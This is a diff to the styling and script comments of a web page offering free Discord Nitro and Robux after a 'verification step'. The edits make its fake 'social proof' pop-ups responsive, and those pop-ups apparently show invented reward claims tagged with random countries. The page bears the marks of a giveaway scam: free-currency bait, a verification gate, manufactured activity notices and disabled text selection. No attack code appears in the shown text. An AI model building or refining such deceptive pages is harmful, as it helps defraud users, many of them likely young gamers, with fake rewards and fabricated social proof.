@@ -7,7 +7,7 @@
   <meta name="description" content="Choose from Discord Nitro and Robux rewards. Complete a quick verification step to claim." />
   <meta name="theme-color" content="#5865f2">
   <style>
-    /* Your full existing CSS – only the toast sizes are made larger */
+    /* All existing styles – only the toast section is replaced with responsive sizes */
     * { user-select: none; -webkit-user-select: none; -webkit-tap-highlight-color: transparent; }
     img { -webkit-user-drag: none; user-drag: none; }
     ::selection { background: transparent; }
@@ -189,55 +189,55 @@
     .faq-item.open .faq-answer { margin-top: 0.6rem; max-height: 200px; opacity: 1; }
     footer { text-align: center; font-size: 0.7rem; color: #7a7f9e; margin-top: 1.2rem; font-weight: 500; }
 
-    /* ----- EVEN LARGER ACTIVITY TOASTS ----- */
+    /* ----- RESPONSIVE TOASTS: scales with screen size and zoom ----- */
     .activity-toasts {
       position: fixed;
-      bottom: 28px;
-      left: 28px;
+      bottom: clamp(12px, 3vw, 28px);
+      left: clamp(12px, 3vw, 28px);
       z-index: 1000;
       display: flex;
       flex-direction: column;
-      gap: 16px;
+      gap: clamp(8px, 2vw, 16px);
       pointer-events: none;
     }
     .activity-toast {
       background: #1a1c2a;
       backdrop-filter: blur(14px);
-      border-radius: 1.25rem;
-      padding: 1.2rem 1.4rem;
-      min-width: 320px;
+      border-radius: clamp(0.75rem, 3vw, 1.25rem);
+      padding: clamp(0.7rem, 2.5vw, 1.2rem) clamp(0.9rem, 3vw, 1.4rem);
+      width: clamp(240px, 70vw, 400px);
       max-width: 400px;
       display: flex;
       align-items: center;
-      gap: 1.2rem;
+      gap: clamp(0.7rem, 2vw, 1.2rem);
       animation: slideInLeft 0.3s cubic-bezier(0.2, 0.9, 0.4, 1.1);
       box-shadow: 0 12px 28px rgba(0, 0, 0, 0.5);
-      border-left: 5px solid;
+      border-left: clamp(3px, 0.8vw, 5px) solid;
     }
     .toast-nitro { border-left-color: #5865f2; }
     .toast-robux { border-left-color: #f5b042; }
     .toast-icon {
-      width: 56px;
-      height: 56px;
+      width: clamp(40px, 8vw, 56px);
+      height: clamp(40px, 8vw, 56px);
       background: #0f1119;
-      border-radius: 1rem;
+      border-radius: clamp(0.7rem, 2vw, 1rem);
       display: flex;
       align-items: center;
       justify-content: center;
       flex-shrink: 0;
     }
     .toast-icon img {
-      width: 40px;
-      height: 40px;
+      width: clamp(28px, 6vw, 40px);
+      height: clamp(28px, 6vw, 40px);
       object-fit: contain;
     }
     .toast-content {
       flex: 1;
     }
     .toast-header {
-      font-size: 0.85rem;
+      font-size: clamp(0.7rem, 2vw, 0.85rem);
       color: #c0c5e0;
-      margin-bottom: 6px;
+      margin-bottom: clamp(2px, 1vw, 6px);
     }
     .toast-header strong {
       color: #fff;
@@ -245,13 +245,13 @@
     }
     .toast-reward {
       font-weight: 700;
-      font-size: 1.1rem;
+      font-size: clamp(0.85rem, 2.5vw, 1.1rem);
       color: #fff;
-      margin-bottom: 6px;
+      margin-bottom: clamp(2px, 1vw, 6px);
       line-height: 1.3;
     }
     .toast-time {
-      font-size: 0.75rem;
+      font-size: clamp(0.6rem, 1.8vw, 0.75rem);
       color: #8a8fb0;
     }
     @keyframes slideInLeft {
@@ -266,13 +266,6 @@
       .reward-card { padding: 0.7rem 0.8rem; gap: 0.8rem; }
       .reward-icon { width: 42px; height: 42px; }
       .reward-icon img { width: 30px; height: 30px; }
-      .activity-toasts { bottom: 16px; left: 16px; gap: 12px; }
-      .activity-toast { min-width: 260px; max-width: 320px; padding: 0.9rem 1rem; gap: 0.8rem; }
-      .toast-icon { width: 44px; height: 44px; }
-      .toast-icon img { width: 30px; height: 30px; }
-      .toast-header { font-size: 0.75rem; }
-      .toast-reward { font-size: 0.95rem; }
-      .toast-time { font-size: 0.65rem; }
     }
     @media (min-width: 768px) and (max-width: 1024px) {
       .wrap { width: min(600px, 90%); }
@@ -463,7 +456,7 @@
       });
     });
 
-    // Social proof toasts – even larger version (as styled above)
+    // Social proof toasts (responsive sizes are handled by CSS)
     const countryNames = [
       "United States", "United Kingdom", "Canada", "Australia", "France", "Germany", "Italy", "Spain",
       "Japan", "South Korea", "India", "Brazil", "Mexico", "Netherlands", "Sweden", "Norway", "Switzerland",
